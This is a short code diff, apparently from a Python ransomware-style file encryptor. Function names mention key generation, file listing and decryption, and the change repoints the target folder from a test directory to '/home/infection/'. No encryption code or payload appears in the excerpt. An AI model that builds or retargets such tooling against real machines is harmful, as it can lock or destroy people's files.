@@ -74,7 +74,7 @@ def unencript_file(name, key):
 if args.genkey:
 	gen_key()
 
-dirpath = 'cositas/'
+dirpath = '/home/infection/'
 
 def getfiles(dirpath):
 	filelist = os.listdir(dirpath)
